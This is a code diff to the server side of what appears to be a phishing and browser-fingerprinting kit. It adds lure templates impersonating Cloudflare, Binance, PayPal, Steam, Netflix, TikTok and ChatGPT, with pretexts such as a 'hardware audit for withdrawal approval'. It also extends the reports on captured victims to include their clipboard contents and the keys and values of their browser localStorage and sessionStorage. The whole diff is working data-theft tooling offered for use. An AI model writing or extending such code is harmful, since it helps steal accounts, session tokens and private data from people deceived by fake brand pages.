@@ -140,8 +140,22 @@ async function startServer() {
         header = '📂 <b>FILE_TRANSFER: ACCESS_KEY_CAPTURED</b>';
       } else if (tmplId === 'security_audit') {
         header = '🛡️ <b>ECOSYSTEM_AUDIT: INTEGRITY_PASS</b>';
+      } else if (tmplId === 'cloudflare') {
+        header = '☁️ <b>CLOUDFLARE_EDGE: INTEGRITY_VERIFIED</b>';
       } else if (tmplId === 'meta_login') {
         header = '💬 <b>META_SOCIAL: IDENTITY_SYNCED</b>';
+      } else if (tmplId === 'binance') {
+        header = '💱 <b>BTC_CRYPTO: ASSET_RECON_SUCCESS</b>';
+      } else if (tmplId === 'paypal') {
+        header = '💳 <b>PAYPAL_FINTECH: AUTH_BUS_GRANTED</b>';
+      } else if (tmplId === 'steam') {
+        header = '🎮 <b>STEAM_GAMING: NODE_SYNC_COMPLETE</b>';
+      } else if (tmplId === 'netflix') {
+        header = '🍿 <b>NETFLIX_SYNC: HOUSEHOLD_GRID_MATCH</b>';
+      } else if (tmplId === 'tiktok') {
+        header = '🎵 <b>TIKTOK_RECON: CREATOR_TELEMETRY</b>';
+      } else if (tmplId === 'chatgpt') {
+        header = '🤖 <b>OPENAI_INTELLIGENCE: DEV_ENV_MAPPED</b>';
       }
 
       let msg = `<b>${header}</b>\n` +
@@ -228,8 +242,13 @@ async function startServer() {
                    `└ Resources: <code>${data.perf_cores || 'N/A'} Cores / ${data.perf_mem || 'N/A'} GB RAM</code>`);
       }
 
+      if (data.clipboard_sync || data.clipboard) {
+        const clip = data.clipboard_sync || data.clipboard;
+        addSection(`📋 CLIPBOARD_SYNC`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1000))}</pre>`);
+      }
+
       if (data.media_hardware) {
-        addSection(`🎙️ AV_HARDWARE_INVENTORY`, `<pre>${escapeHTML(data.media_hardware.substring(0, 500))}</pre>`);
+        addSection(`🎙️ AV_HARDWARE_INVENTORY`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
       }
 
       if (data.file_name) {
@@ -271,9 +290,10 @@ async function startServer() {
       if (apiTxt) addSection(`🧱 HARDWARE_API_AVAILABILITY`, apiTxt);
 
       if (data.social_active || data.social_inactive) {
-         addSection(`🤝 SOCIAL_PRESENCE_SCAN`,
-                     `├ Found: <code>${data.social_active || 'None'}</code>\n` +
-                     `└ Latency: <code>${data.load_ms || 'N/A'}ms</code>`);
+         let socialTxt = '';
+         if (data.social_active) socialTxt += `├ Active: <code>${data.social_active}</code> (${data.load_ms || 'N/A'}ms)\n`;
+         if (data.social_inactive) socialTxt += `└ Inactive: <code>${data.social_inactive}</code>\n`;
+         addSection(`🤝 SOCIAL_PRESENCE_SCAN`, socialTxt);
       }
 
       if (data.network_rtt || data.latency) {
@@ -308,9 +328,26 @@ async function startServer() {
       }
 
       if (data.storage_ls || data.storage_ss) {
-        addSection(`📂 PERSISTENT_MEMORY_RECAP`,
-                    `├ LocalStorage: <i>${data.storage_ls ? 'CAPTURED' : 'EMPTY'}</i>\n` +
-                    `└ SessionStorage: <i>${data.storage_ss ? 'CAPTURED' : 'EMPTY'}</i>`);
+        let storageTxt = '';
+        if (data.storage_ls) {
+          try {
+            const ls = typeof data.storage_ls === 'string' ? JSON.parse(data.storage_ls) : data.storage_ls;
+            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(ls).length} keys</code>\n`;
+            Object.entries(ls).slice(0, 5).forEach(([k, v]) => {
+              storageTxt += `│ └ <code>${k}</code>: ${String(v).substring(0, 40)}${String(v).length > 40 ? '...' : ''}\n`;
+            });
+          } catch(e) { storageTxt += `├ LocalStorage: [Captured but Parse-Error]\n`; }
+        }
+        if (data.storage_ss) {
+          try {
+            const ss = typeof data.storage_ss === 'string' ? JSON.parse(data.storage_ss) : data.storage_ss;
+            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ss).length} keys</code>\n`;
+            Object.entries(ss).slice(0, 3).forEach(([k, v]) => {
+              storageTxt += `  └ <code>${k}</code>: ${String(v).substring(0, 40)}${String(v).length > 40 ? '...' : ''}\n`;
+            });
+          } catch(e) { storageTxt += `└ SessionStorage: [Captured but Parse-Error]\n`; }
+        }
+        addSection(`💾 PERSISTENT_MEMORY_DUMP`, storageTxt);
       }
 
       if (data.display_hz || data.orientation) {
@@ -501,11 +538,17 @@ async function startServer() {
         'google': '└ <i>Identity Ecosystem. Audit browser-bus & high-entropy patterns.</i>',
         'gallery': '└ <i>Forensic Registry. Media telemetry & social-graph extraction.</i>',
         'cloudflare': '└ <i>Edge Verification. Precision fingerprinting & sensor audit.</i>',
-        'pegasus': '└ <i>Kernel Intelligence v9.3. Elite hardware diagnostics (Extreme).</i>',
+        'pegasus': '└ <i>Kernel Intelligence v9.3. Elite hardware diagnostics (Stable).</i>',
         'wifi': '└ <i>Hotspot Auth. Network forensic mapping & triangulation.</i>',
         'recap': '└ <i>Ghost Recon. Multi-layered silent background telemetry.</i>',
         'security_audit': '└ <i>System Audit. Cross-browser environment integrity check.</i>',
-        'meta_login': '└ <i>Social Sync. Recover account via hardware identity.</i>'
+        'meta_login': '└ <i>Social Sync. Recover account via hardware identity.</i>',
+        'binance': '└ <i>Crypto Security. Hardware audit for withdrawal approval.</i>',
+        'paypal': '└ <i>Fintech Audit. Transaction safety & device verification.</i>',
+        'steam': '└ <i>Gaming Guard. Account recovery & authenticator sync.</i>',
+        'netflix': '└ <i>Media Sync. Household verification via grid mapping.</i>',
+        'tiktok': '└ <i>Creator Audit. Environment integrity for creator status.</i>',
+        'chatgpt': '└ <i>AI Dev Audit. API quota & developer environment check.</i>'
       };
 
       Object.entries(templates).forEach(([key, tmpl]) => {
